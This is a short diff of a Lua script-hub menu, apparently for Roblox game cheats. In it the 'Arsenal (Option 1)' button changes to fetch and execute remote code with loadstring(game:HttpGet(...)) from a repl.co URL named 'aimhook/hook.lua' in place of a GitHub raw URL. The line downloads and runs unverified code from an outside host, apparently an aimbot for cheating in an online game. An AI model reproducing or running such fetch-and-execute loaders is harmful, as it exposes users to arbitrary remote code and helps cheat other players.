@@ -624,7 +624,7 @@ end)
 local Tab1Section = Tab1:NewSection("Shooter Games")
 
 Tab1Section:NewButton("Arsenal (Option 1)","No description",function()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Maikderninja/Maikderninja/main/PWNERHUB.lua"))();
+loadstring(game:HttpGet("https://gangofgang.gog-best.repl.co/aimhook/hook.lua"))()
 end)
 
 Tab1Section:NewButton("Arsenal (Option 2)","No description",function()
